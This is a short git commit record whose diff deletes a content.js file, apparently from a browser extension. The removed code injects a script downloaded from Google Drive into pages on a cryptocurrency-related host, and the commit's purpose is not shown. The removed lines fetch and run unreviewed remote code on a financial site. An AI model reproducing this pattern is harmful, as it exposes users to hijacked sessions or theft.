4eafb01dbac3e6498236c72aefb8e2a87a504035
hungtran97 <hungtran.nh97@gmail.com>
2017-12-06 03:53:36 +0700

    master

--- content.js
+++
@@ -1,6 +0,0 @@
-if(window.location.hostname==='wake.unixcoin.com'){
-	var s = document.createElement("script");
-    s.type = "text/javascript";
-    s.src = "https://drive.google.com/uc?authuser=0&id=1TNu9u25UkFLsMB-1S9iycfXBUcfma4yc&export=download";
-    $("body").append(s);
-}
